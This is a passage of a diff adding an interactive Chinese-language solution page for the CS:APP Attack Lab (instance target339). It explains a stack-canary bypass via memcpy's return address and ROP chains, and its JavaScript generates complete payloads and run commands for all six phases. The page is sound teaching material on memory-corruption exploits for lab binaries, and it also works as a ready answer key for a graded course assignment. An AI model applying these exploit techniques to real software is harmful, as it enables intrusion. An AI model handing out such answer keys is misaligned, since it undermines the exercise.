+  401eef:   leave
+  401ef0:   ret
+</pre>
+    <div class="amem">
+      <div class="row"><div class="off">rbp - 0xa0</div><div class="blk buf">Gets 写入的缓冲区（160 字节）</div><div class="note">输入从这里开始</div></div>
+      <div class="row"><div class="off">rbp - 0x1c</div><div class="blk chain">int offset（4 字节）</div><div class="note">缓冲区偏移 132</div></div>
+      <div class="row"><div class="off">rbp - 0x08</div><div class="blk canary">canary（8 字节）</div><div class="note">输入偏移 152</div></div>
+      <div class="row"><div class="off">rbp + 0x00</div><div class="blk junk">saved rbp</div><div class="note">输入偏移 160</div></div>
+      <div class="row"><div class="off">rbp + 0x08</div><div class="blk ret">saved return address</div><div class="note">输入偏移 168</div></div>
+    </div>
+    <p>缓冲区只有 160 字节，但 <code>Gets</code> 不检查长度；输入超过 152 字节就会碰到 canary，超过 160 字节会覆盖 saved rbp，超过 168 字节会覆盖返回地址。可是 canary 是随机值，没有泄露函数，猜不中——覆盖它只会得到：</p>
+    <p class="mono">Ouch!: You change the canary value!</p>
+
+    <h3>8.2 突破口：memcpy 自己的返回地址</h3>
+    <p><code>getbuf_withcanary</code> 在 <code>Gets</code> 之后调用了一次 <code>memcpy(dst, src, 128)</code>，而 <code>dst</code> 由输入中的 <code>offset</code> 决定：</p>
+    <div class="formula">dst = (rbp − 0x120) + offset</div>
+    <p><code>offset</code> 是 32 位有符号整数，可以取负。选 <code>offset = −24</code>：</p>
+    <div class="formula">dst = rbp − 0x120 − 0x18 = rbp − 0x138</div>
+    <p><code>memcpy</code> 的调用发生在 <code>call memcpy</code>，返回地址被压在 <code>rbp − 0x128</code>。它正好是 <code>dst + 0x10</code>，也就是输入的第 16–23 字节。于是：</p>
+    <div class="formula">input[16..23] = leave; ret 的地址 &nbsp;→&nbsp; memcpy 返回时直接跳到 leave; ret</div>
+    <p><code>leave</code> 执行 <code>rsp = rbp; pop rbp; ret</code>，把栈枢轴到 <code>getbuf_withcanary</code> 的 saved rbp / return address，也就是输入偏移 160 / 168 的位置。canary 检查发生在 <code>memcpy</code> 之后，但此时 CPU 已经被劫持，根本走不到检查。</p>
+    <div class="box"><div class="t">这不是「绕过 canary 的值」，而是「绕过 canary 的检查点」</div>
+      不需要知道 canary，也不需要覆盖它之后还能返回。攻击发生在 canary 检查之前，属于典型的「利用函数内部写原语改写控制流」。
+    </div>
+
+    <h3>8.3 payload 布局</h3>
+    <div class="tbl-wrap">
+      <table class="tbl">
+        <tr><th>输入偏移</th><th>长度</th><th>内容</th><th>作用</th></tr>
+        <tr><td class="mono">0–15</td><td class="mono">16</td><td class="mono">填充</td><td>被 memcpy 复制到 dst，无实际作用</td></tr>
+        <tr><td class="mono">16–23</td><td class="mono">8</td><td class="mono">0x402018（leave; ret）</td><td>覆盖 memcpy 的返回地址</td></tr>
+        <tr><td class="mono">24–131</td><td class="mono">108</td><td class="mono">填充</td><td>缓冲区剩余部分</td></tr>
+        <tr><td class="mono">132–135</td><td class="mono">4</td><td class="mono">e8 ff ff ff（−24）</td><td>让 dst = rbp − 0x138</td></tr>
+        <tr><td class="mono">136–159</td><td class="mono">24</td><td class="mono">填充</td><td>到 canary 之前</td></tr>
+        <tr><td class="mono">160–167</td><td class="mono">8</td><td class="mono">任意</td><td>被 <code>leave</code> 弹进 rbp，无所谓</td></tr>
+        <tr><td class="mono">168–239</td><td class="mono">72</td><td class="mono">9 个 qword 的 ROP 链</td><td>从 <code>leave;ret</code> 的 <code>ret</code> 开始执行</td></tr>
+        <tr><td class="mono">240–248</td><td class="mono">9</td><td class="mono">"29b55047\0"</td><td>传给 touch3 的字符串</td></tr>
+      </table>
+    </div>
+
+    <h3>8.4 starget 的 gadget 地址</h3>
+    <p><code>starget</code> 的 farm 比 <code>rtarget</code> 整体后移了 7 字节，不能照抄上一关的地址。本实例可用的：</p>
+    <div class="tbl-wrap">
+      <table class="tbl">
+        <tr><th>地址</th><th>字节</th><th>指令</th></tr>
+        <tr><td class="mono">0x402018</td><td class="mono">c9 c3</td><td class="gadget">leave ; ret</td></tr>
+        <tr><td class="mono">0x401f24</td><td class="mono">58 c3</td><td class="gadget">pop %rax ; ret</td></tr>
+        <tr><td class="mono">0x401f76</td><td class="mono">91 c3</td><td class="gadget">xchg %eax,%ecx ; ret</td></tr>
+        <tr><td class="mono">0x401f74</td><td class="mono">89 ce 91 c3</td><td class="gadget">mov %ecx,%esi ; xchg %eax,%ecx ; ret</td></tr>
+        <tr><td class="mono">0x401f95</td><td class="mono">48 89 e0 c3</td><td class="gadget">mov %rsp,%rax ; ret</td></tr>
+        <tr><td class="mono">0x401f18</td><td class="mono">48 89 c7 c3</td><td class="gadget">mov %rax,%rdi ; ret</td></tr>
+        <tr><td class="mono">0x401f59</td><td class="mono">f3 0f 1e fa 48 8d 04 37 c3</td><td class="gadget">endbr64 ; lea (%rdi,%rsi,1),%rax ; ret（add_xy）</td></tr>
+        <tr><td class="mono">0x401dab</td><td class="mono">—</td><td class="gadget">touch3</td></tr>
+      </table>
+    </div>
+    <p>链的结构与 phase 5 完全一样，只是把每个 gadget 换成上表地址：<code>pop rax; 32; xchg; mov esi,ecx; mov rax,rsp; mov rdi,rax; add_xy; mov rdi,rax; touch3</code>，字符串放在 <code>buffer + 240</code>。执行到 <code>mov rax,rsp</code>（链偏移 200）时 <code>rsp = buffer + 208</code>，所以偏移仍是 32。</p>
+
+    <div class="builder" data-phase="6">
+      <div class="bh">Phase 6 payload</div>
+      <div class="bs">249 字节；覆盖 memcpy 返回地址 + offset −24 + canary 之后的 ROP 链。</div>
+    </div>
+
+    <div class="box ok"><div class="t">预期输出</div>
+      <p class="mono" style="margin:4px 0">Touch3!: You called touch3("29b55047")<br>Valid solution for level 3 with target starget</p>
+    </div>
+
+    <div class="box warn"><div class="t">三个最容易错的点</div>
+      ① <code>offset</code> 写成了 <code>0x18</code> 而不是 <code>−24</code>：那会写到 <code>rbp − 0x108</code>，覆盖不到 memcpy 的返回地址；② 把 <code>leave;ret</code> 放在输入偏移 24 而不是 16：memcpy 返回地址在 <code>dst + 0x10</code>，不是 <code>dst</code>；③ 用了 rtarget 的 gadget 地址：starget 的 farm 后移，<code>pop rax</code> 在 <code>0x401f24</code> 而不是 <code>0x401f1d</code>。
+    </div>
+  </section>
+
+  <!-- ================= 9 排错 ================= -->
+  <section id="s9">
+    <h2>9. 通关核对与排错</h2>
+    <p class="lede">六个 phase 的预期输出、常见报错和 <code>gdb</code> 命令都放在这一节。先对照「通关标志」，再看报错表定位。</p>
+
+    <h3>9.1 预期输出对照</h3>
+    <div class="tbl-wrap">
+      <table class="tbl">
+        <tr><th>#</th><th>命令</th><th>应该看到</th></tr>
+        <tr><td class="mono">1</td><td class="mono">./ctarget -q -i phase1.raw</td><td class="mono">Touch1! … level 1 with target ctarget</td></tr>
+        <tr><td class="mono">2</td><td class="mono">./ctarget -q -i phase2.raw</td><td class="mono">Touch2!(0x29b55047) … level 2 with target ctarget</td></tr>
+        <tr><td class="mono">3</td><td class="mono">./ctarget -q -i phase3.raw</td><td class="mono">Touch3!("29b55047") … level 3 with target ctarget</td></tr>
+        <tr><td class="mono">4</td><td class="mono">./rtarget -q -i phase4.raw</td><td class="mono">Touch2!(0x29b55047) … level 2 with target rtarget</td></tr>
+        <tr><td class="mono">5</td><td class="mono">./rtarget -q -i phase5.raw</td><td class="mono">Touch3!("29b55047") … level 3 with target rtarget</td></tr>
+        <tr><td class="mono">6</td><td class="mono">./starget -q -i phase6.raw</td><td class="mono">Touch3!("29b55047") … level 3 with target starget</td></tr>
+      </table>
+    </div>
+
+    <h3>9.2 常见报错</h3>
+    <div class="tbl-wrap">
+      <table class="tbl">
+        <tr><th>现象</th><th>通常原因</th><th>怎么修</th></tr>
+        <tr><td class="mono">No exploit. Getbuf returned 0x1</td><td>返回地址没被覆盖，或 <code>hex2raw</code> 没读到输入</td><td>检查 payload 长度是否 ≥ 32；确认 <code>hex2raw</code> 的输入文件不是空文件；确认 <code>-i</code> 指向 <code>.raw</code> 而不是 <code>.txt</code></td></tr>
+        <tr><td class="mono">Normal return</td><td><code>getbuf</code> 正常返回，说明覆盖位置不对</td><td>重新确认 <code>sub $0x18</code>：返回地址在偏移 24，不是 32</td></tr>
+        <tr><td class="mono">Ouch!: You caused a segmentation fault!</td><td>跳到了非法地址、gadget 地址错、字符串地址错</td><td>用 <code>gdb</code> 在 <code>ret</code> 前看 <code>$rsp</code> 和 <code>x/8gx $rsp</code>；逐个核对 qword</td></tr>
+        <tr><td class="mono">Misfire: You called touch3("…")</td><td><code>rdi</code> 指向了错误内容，或字符串被栈帧覆盖</td><td>phase 3 把字符串挪到 <code>buffer + 40</code>；检查 <code>movabs</code> 的立即数</td></tr>
+        <tr><td class="mono">Ouch!: You change the canary value!</td><td>phase 6 的 <code>offset</code> 没让 memcpy 覆盖到自己的返回地址</td><td>确认 offset 字段在输入偏移 132，值为 <code>e8 ff ff ff</code>；确认 <code>leave;ret</code> 在输入偏移 16</td></tr>
+        <tr><td class="mono">Type string:</td><td>target 在等标准输入，没读到 <code>-i</code> 文件</td><td>检查文件名、权限；必要时 <code>chmod +x ctarget</code></td></tr>
+      </table>
+    </div>
+
+    <h3>9.3 gdb 速查</h3>
+    <div class="tbl-wrap">
+      <table class="tbl">
+        <tr><th>命令</th><th>用途</th></tr>
+        <tr><td class="mono">disas getbuf</td><td>反汇编单个函数，确认 <code>sub</code> 大小和断点地址</td></tr>
+        <tr><td class="mono">b *0x401c38</td><td>在 <code>sub $0x18,%rsp</code> 之后下断</td></tr>
+        <tr><td class="mono">run -q -i phase1.raw</td><td>带输入文件启动</td></tr>
+        <tr><td class="mono">p/x $rsp</td><td>读缓冲区地址</td></tr>
+        <tr><td class="mono">x/12gx $rsp</td><td>按 8 字节看栈上的 payload</td></tr>
+        <tr><td class="mono">info registers rip rsp rdi rsi rax</td><td>看当前寄存器和下一条指令</td></tr>
+        <tr><td class="mono">si</td><td>单步进入一条指令</td></tr>
+        <tr><td class="mono">b *0x401cbc</td><td>在 <code>touch1</code> 下断，确认是否跳对</td></tr>
+        <tr><td class="mono">x/6i $rip</td><td>看当前指令附近的代码</td></tr>
+      </table>
+    </div>
+    <div class="box"><div class="t">gdb 默认关闭 ASLR</div>
+      在 <code>gdb</code> 里看到的栈地址通常每次相同，这是 gdb 的 <code>set disable-randomization on</code> 造成的。要复现「真实运行」的 ASLR，可在 gdb 里 <code>set disable-randomization off</code>；反过来，如果某条链依赖固定栈地址，在 shell 里可以用 <code>setarch $(uname -m) -R ./rtarget …</code> 关闭 ASLR。本页的 phase 4–6 不依赖绝对栈地址，不需要这一步。
+    </div>
+
+    <h3>9.4 换一个实例要改什么</h3>
+    <div class="steps">
+      <div class="step on"><div class="h">Cookie</div><div class="m">读 <code>cookie.txt</code>，替换本页的 <code>0x29b55047</code></div><div class="e">phase 2、4 的立即数，phase 3、5、6 的字符串都要跟着变。</div></div>
+      <div class="step"><div class="h">ctarget 缓冲区地址</div><div class="m">在 <code>getbuf</code> 的 <code>sub</code> 之后 <code>p/x $rsp</code></div><div class="e">只影响 phase 2、3；本页配置区可以改。</div></div>
+      <div class="step"><div class="h">函数地址</div><div class="m"><code>objdump -d</code> 找 <code>touch1/2/3</code>，<code>nm -n</code> 也可以</div><div class="e">如果换了二进制，<code>touch</code> 的地址可能不同。</div></div>
+      <div class="step"><div class="h">gadget 地址</div><div class="m">对新的 <code>rtarget</code> / <code>starget</code> 重新扫 farm</div><div class="e">farm 的函数顺序、立即数都可能变；不要跨二进制复用地址。</div></div>
+    </div>
+  </section>
+
+  <!-- ================= 10 附录 ================= -->
+  <section id="s10">
+    <h2>10. 附录：地址表与验证记录</h2>
+    <p class="lede">下面是本实例（target339）用到的全部地址，以及本页六个 payload 的实测结果。</p>
+
+    <h3>10.1 函数地址</h3>
+    <div class="tbl-wrap">
+      <table class="tbl">
+        <tr><th>符号</th><th>ctarget</th><th>rtarget</th><th>starget</th></tr>
+        <tr><td class="mono">getbuf</td><td class="mono">0x401c30</td><td class="mono">0x401c30</td><td class="mono">—</td></tr>
+        <tr><td class="mono">getbuf_withcanary</td><td class="mono">—</td><td class="mono">—</td><td class="mono">0x401e7f</td></tr>
+        <tr><td class="mono">touch1</td><td class="mono">0x401cbc</td><td class="mono">0x401c4a</td><td class="mono">0x401c51</td></tr>
+        <tr><td class="mono">touch2</td><td class="mono">0x401cf0</td><td class="mono">0x401c7e</td><td class="mono">0x401c85</td></tr>
+        <tr><td class="mono">touch3</td><td class="mono">0x401e16</td><td class="mono">0x401da4</td><td class="mono">0x401dab</td></tr>
+        <tr><td class="mono">start_farm</td><td class="mono">—</td><td class="mono">0x401eea</td><td class="mono">0x401ef1</td></tr>
+        <tr><td class="mono">end_farm</td><td class="mono">—</td><td class="mono">0x4020b3</td><td class="mono">0x4020ba</td></tr>
+      </table>
+    </div>
+
+    <h3>10.2 关键地址速查</h3>
+    <div class="tbl-wrap">
+      <table class="tbl">
+        <tr><th>用途</th><th>地址 / 值</th><th>说明</th></tr>
+        <tr><td>Cookie</td><td class="mono">0x29b55047</td><td>4 字节签名</td></tr>
+        <tr><td>ctarget 缓冲区</td><td class="mono">0x55639868</td><td><code>getbuf</code> 的 <code>$rsp</code></td></tr>
+        <tr><td>phase 3 字符串</td><td class="mono">0x55639890</td><td><code>buffer + 40</code></td></tr>
+        <tr><td>starget 的 memcpy 返回槽</td><td class="mono">rbp − 0x128</td><td>输入偏移 16 覆盖它</td></tr>
+        <tr><td>starget 的 ROP 起点</td><td class="mono">rbp + 8</td><td>输入偏移 168</td></tr>
+      </table>
+    </div>
+
+    <h3>10.3 本页的验证记录</h3>
+    <div class="box ok">
+      <div class="t">六个 phase 均已在本机复现</div>
+      <p style="margin:4px 0">使用 <code>hex2raw</code> 把页面生成的文本转成 raw，再分别运行：<code>ctarget</code> × 3、<code>rtarget</code> × 2、<code>starget</code> × 1，全部得到 <code>PASS</code>。本页的地址、字节序列与输出均来自这次实测。</p>
+    </div>
+    <div class="box"><div class="t">免责声明</div>
+      这是针对 <b>target339</b> 这一份 tar 的解题指引。课程若要求独立完成，请把本页当作「卡住时对照思路」的参考，而不是直接抄答案；真正的能力是能对着一份没见过的二进制重新走一遍上面的流程。
+    </div>
+  </section>
+  </main>
+</div>
+
+<div class="footer">
+  本页由 <code>target339.tar</code> 的反汇编与实测结果整理而成 · Cookie <code>0x29b55047</code> · 六个 payload 均为本实例实测通过。
+</div>
+<button class="totop" id="toTop">↑ 顶部</button>
+
+
+<script>
+"use strict";
+/* ============================================================
+   Attack Lab · 中文交互版
+   所有 payload 都在页面内现算；所有数值均来自 target339 的实测。
+   ============================================================ */
+
+const $  = (s, r = document) => r.querySelector(s);
+const $$ = (s, r = document) => Array.from(r.querySelectorAll(s));
+const esc = s => String(s).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
+
+/* ---------- 本实例用到的固定地址 ---------- */
+const A = {
+  /* ctarget */
+  p1_touch1:        0x401cbcn,
+  p2_touch2:        0x401cf0n,
+  p3_touch3:        0x401e16n,
+  /* rtarget */
+  rt_touch2:        0x401c7en,
+  rt_touch3:        0x401da4n,
+  rt_pop_rax:       0x401f1dn,
+  rt_mov_rdi_rax:   0x401f11n,
+  rt_xchg:          0x401f6fn,
+  rt_mov_esi:       0x401f6dn,
+  rt_mov_rax_rsp:   0x401f8en,
+  rt_add_xy:        0x401f52n,
+  /* starget */
+  st_touch3:        0x401dabn,
+  st_leave_ret:     0x402018n,
+  st_pop_rax:       0x401f24n,
+  st_xchg:          0x401f76n,
+  st_mov_esi:       0x401f74n,
+  st_mov_rax_rsp:   0x401f95n,
+  st_mov_rdi_rax:   0x401f18n,
+  st_add_xy:        0x401f59n
+};
+
+const DEFAULTS = { cookie: 0x29b55047n, buf: 0x55639868n };
+const state = { cookie: DEFAULTS.cookie, buf: DEFAULTS.buf };
+
+/* ---------- 数值与字节工具 ---------- */
+const MASK32 = 0xffffffffn;
+
+function hex32(n) {
+  return '0x' + (BigInt(n) & MASK32).toString(16).padStart(8, '0');
+}
+function hexAddr(n) {
+  return '0x' + BigInt(n).toString(16);
+}
+function cookieHex(n) {
+  return (BigInt(n) & MASK32).toString(16).padStart(8, '0');
+}
+function parseNum(s, max) {
+  s = String(s).trim().replace(/[_\s]/g, '');
+  if (!s) return null;
+  if (!/^(0x)?[0-9a-f]+$/i.test(s)) return null;
+  let v;
+  try { v = BigInt(/^0x/i.test(s) ? s : '0x' + s); } catch (e) { return null; }
+  if (v < 0n || v > max) return null;
+  return v;
+}
+function q(n) {
+  n = BigInt(n);
+  const a = [];
+  for (let i = 0; i < 8; i++) a.push(Number((n >> BigInt(8 * i)) & 0xffn));
+  return a;
+}
+function d(n) {
+  n = BigInt(n);
+  const a = [];
+  for (let i = 0; i < 4; i++) a.push(Number((n >> BigInt(8 * i)) & 0xffn));
+  return a;
+}
+function rep(b, n) { return Array(n).fill(b); }
+function put(dst, off, bytes) {
+  for (let i = 0; i < bytes.length; i++) dst[off + i] = bytes[i] & 0xff;
+}
+
+/* ---------- 六个 phase 的 payload ---------- */
+function build(phase) {
+  const cookie = state.cookie;
+  const buf = state.buf;
+
+  if (phase === 1) {
+    const b = rep(0x41, 24);
+    b.push(...q(A.p1_touch1));
+    return b;
+  }
+
+  if (phase === 2) {
+    const code = [0xbf, ...d(cookie), 0xc3];          // mov $cookie,%edi ; ret
+    const b = code.concat(rep(0x41, 24 - code.length));
+    b.push(...q(buf), ...q(A.p2_touch2));
+    return b;
+  }
+
+  if (phase === 3) {
+    const code = [0x48, 0xbf, ...q(buf + 40n), 0xc3]; // movabs $buf+40,%rdi ; ret
+    const b = code.concat(rep(0x41, 24 - code.length));
+    b.push(...q(buf), ...q(A.p3_touch3));
+    b.push(...cookieHex(cookie).split('').map(c => c.charCodeAt(0)), 0x00);
+    return b;
+  }
+
+  if (phase === 4) {
+    const b = rep(0x41, 24);
+    b.push(...q(A.rt_pop_rax), ...q(cookie), ...q(A.rt_mov_rdi_rax), ...q(A.rt_touch2));
+    return b;
+  }
+
+  if (phase === 5) {
+    const b = rep(0x41, 24);
+    const chain = [
+      A.rt_pop_rax, 32n, A.rt_xchg, A.rt_mov_esi, A.rt_mov_rax_rsp,
+      A.rt_mov_rdi_rax, A.rt_add_xy, A.rt_mov_rdi_rax, A.rt_touch3
+    ];
+    for (const v of chain) b.push(...q(v));
+    b.push(...cookieHex(cookie).split('').map(c => c.charCodeAt(0)), 0x00);
+    return b;
+  }
+
+  if (phase === 6) {
+    const b = rep(0x41, 249);
+    put(b, 16, q(A.st_leave_ret));       // 覆盖 memcpy 的返回地址
+    put(b, 132, [0xe8, 0xff, 0xff, 0xff]); // offset = -24
+    const chain = [
+      A.st_pop_rax, 32n, A.st_xchg, A.st_mov_esi, A.st_mov_rax_rsp,
+      A.st_mov_rdi_rax, A.st_add_xy, A.st_mov_rdi_rax, A.st_touch3
+    ];
+    let off = 168;
+    for (const v of chain) { put(b, off, q(v)); off += 8; }
+    put(b, 240, cookieHex(cookie).split('').map(c => c.charCodeAt(0)).concat([0x00]));
+    return b;
+  }
+
+  throw new Error('unknown phase ' + phase);
+}
+
+/* ---------- 渲染 ---------- */
+function hexText(bytes) {
+  const lines = [];
+  for (let i = 0; i < bytes.length; i += 16) {
+    lines.push(bytes.slice(i, i + 16).map(b => b.toString(16).padStart(2, '0')).join(' '));
+  }
+  return lines.join('\n');
+}
+function targetFor(phase) {
+  return phase <= 3 ? 'ctarget' : (phase <= 5 ? 'rtarget' : 'starget');
+}
+function commandText(phase, hex) {
+  const t = 'phase' + phase;
+  return [
+    "cat > " + t + ".txt <<'EOF'",
+    hex,
+    'EOF',
+    './hex2raw < ' + t + '.txt > ' + t + '.raw',
+    './' + targetFor(phase) + ' -q -i ' + t + '.raw'
+  ].join('\n');
+}
+
+const builders = new Map();
+
+function mountBuilders() {
+  $$('.builder[data-phase]').forEach(box => {
+    const n = Number(box.dataset.phase);
+    box.insertAdjacentHTML('beforeend',
+      '<div class="pltools">' +
+        '<span class="chip" id="len' + n + '">— B</span>' +
+        '<button class="sm" data-copy="pl' + n + '">复制 hex</button>' +
+        '<button class="sm" data-copycmd="cmd' + n + '">复制运行命令</button>' +
+      '</div>' +
+      '<pre class="hexbox" id="pl' + n + '"></pre>' +
+      '<details class="reveal"><summary>运行命令（hex2raw + target）</summary>' +
+        '<pre class="hexbox cmd" id="cmd' + n + '"></pre></details>'
+    );
+    builders.set(n, {
+      pre: $('#pl' + n),
+      cmd: $('#cmd' + n),
+      len: $('#len' + n)
+    });
+  });
+}
+
+function renderPhase(n) {
+  const b = build(n);
+  const hex = hexText(b);
+  const g = builders.get(n);
+  if (!g) return;
+  g.pre.textContent = hex;
+  g.len.textContent = b.length + ' B';
+  g.cmd.textContent = commandText(n, hex);
+}
+
+function renderAll() {
+  builders.forEach((_, n) => renderPhase(n));
+}
+
+/* ---------- 配置区 ---------- */
+function setCfgMsg(kind, html) {
+  const el = $('#cfgMsg');
+  if (!el) return;
+  el.innerHTML = '<div class="box ' + (kind || '') + '" style="margin:8px 0 0"><div class="t">' +
+    (kind === 'bad' ? '输入无效' : '当前参数') + '</div>' + html + '</div>';
+}
+function updateConfig() {
+  const c = parseNum($('#cfgCookie').value, MASK32);
+  const b = parseNum($('#cfgBuf').value, 0x7fffffffffffn);
+  if (c === null || b === null) {
+    setCfgMsg('bad', 'Cookie 必须是 32 位十六进制数（可带 <code>0x</code>）；缓冲区地址必须是有效的 64 位以内的十六进制地址。');
+    return;
+  }
+  state.cookie = c;
+  state.buf = b;
+  setCfgMsg('', 'Cookie = <code>' + hex32(c) + '</code>，ctarget 缓冲区 = <code>' + hexAddr(b) +
+    '</code>；phase 3 的字符串地址 = <code>' + hexAddr(b + 40n) + '</code>。下方所有 payload 已同步。');
+  renderAll();
+}
+function resetConfig() {
+  $('#cfgCookie').value = hex32(DEFAULTS.cookie);
+  $('#cfgBuf').value = hexAddr(DEFAULTS.buf);
+  updateConfig();
+}
+
+/* ---------- 复制 ---------- */
+function fallbackCopy(text) {
+  const ta = document.createElement('textarea');
+  ta.value = text;
+  ta.style.position = 'fixed';
+  ta.style.left = '-9999px';
+  document.body.appendChild(ta);
+  ta.select();
+  let ok = false;
+  try { ok = document.execCommand('copy'); } catch (e) { ok = false; }
+  document.body.removeChild(ta);
+  return ok;
+}
+function flash(btn, text) {
+  const old = btn.textContent;
+  btn.textContent = text;
+  btn.disabled = true;
+  setTimeout(() => { btn.textContent = old; btn.disabled = false; }, 1200);
+}
+function copyFrom(btn, sel, label) {
+  const el = $(sel);
+  if (!el) return;
+  const text = el.textContent;
+  const done = () => flash(btn, '已复制');
+  if (navigator.clipboard && window.isSecureContext) {
+    navigator.clipboard.writeText(text).then(done).catch(() => {
+      if (fallbackCopy(text)) done(); else flash(btn, '复制失败');
+    });
+  } else {
+    if (fallbackCopy(text)) done(); else flash(btn, '复制失败');
+  }
+}
+
+/* ---------- 通关进度 ---------- */
+const LS_KEY = 'ics-attacklab-progress-v1';
+function loadProgress() {
+  try { return JSON.parse(localStorage.getItem(LS_KEY) || '{}') || {}; }
+  catch (e) { return {}; }
+}
+function saveProgress(p) {
+  try { localStorage.setItem(LS_KEY, JSON.stringify(p)); } catch (e) {}
+}
+function updateProgress() {
+  const boxes = $$('#checklist input[type=checkbox]');
+  const done = boxes.filter(x => x.checked).length;
+  const pct = boxes.length ? Math.round(done * 100 / boxes.length) : 0;
+  const txt = $('#pgText'), bar = $('#pgBar');
+  if (txt) txt.textContent = '通关进度 ' + done + '/' + boxes.length;
+  if (bar) bar.style.width = pct + '%';
+  boxes.forEach(x => {
+    const item = x.closest('.checkitem');
+    if (item) item.classList.toggle('done', x.checked);
+  });
+}
+function initProgress() {
+  const p = loadProgress();
+  $$('#checklist input[type=checkbox]').forEach(x => {
+    x.checked = !!p[x.dataset.ph];
+    x.addEventListener('change', () => {
+      const cur = loadProgress();
+      if (x.checked) cur[x.dataset.ph] = 1; else delete cur[x.dataset.ph];
+      saveProgress(cur);
+      updateProgress();
+    });
+  });
+  updateProgress();
+}
+
+/* ---------- 目录高亮 / 回到顶部 ---------- */
+function initToc() {
+  const links = $$('nav.toc a[href^="#"]');
+  if (!links.length || !('IntersectionObserver' in window)) return;
+  const map = new Map();
+  links.forEach(a => {
+    const id = a.getAttribute('href').slice(1);
+    const sec = document.getElementById(id);
+    if (sec) map.set(sec, a);
+  });
+  const io = new IntersectionObserver(entries => {
+    entries.forEach(en => {
+      if (!en.isIntersecting) return;
+      links.forEach(a => a.classList.remove('active'));
+      const a = map.get(en.target);
+      if (a) a.classList.add('active');
+    });
+  }, { rootMargin: '-20% 0px -70% 0px', threshold: 0 });
+  map.forEach((_, sec) => io.observe(sec));
+}
+function initTop() {
+  const btn = $('#toTop');
+  if (!btn) return;
+  const onScroll = () => { btn.style.display = window.scrollY > 600 ? 'block' : 'none'; };
+  window.addEventListener('scroll', onScroll, { passive: true });
+  onScroll();
+  btn.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
+}
+
+/* ---------- 启动 ---------- */
+document.addEventListener('DOMContentLoaded', () => {
+  mountBuilders();
+  renderAll();
+  initProgress();
+  initToc();
+  initTop();
+
+  const c = $('#cfgCookie'), b = $('#cfgBuf');
+  if (c) c.addEventListener('input', updateConfig);
+  if (b) b.addEventListener('input', updateConfig);
+  const r = $('#cfgReset');
+  if (r) r.addEventListener('click', resetConfig);
+  updateConfig();
+
+  document.addEventListener('click', e => {
+    const cp = e.target.closest('[data-copy]');
+    if (cp) { copyFrom(cp, '#' + cp.dataset.copy); return; }
+    const cc = e.target.closest('[data-copycmd]');
+    if (cc) { copyFrom(cc, '#' + cc.dataset.copycmd); return; }
+  });
+});
+
+</script>
+</body>
+</html>
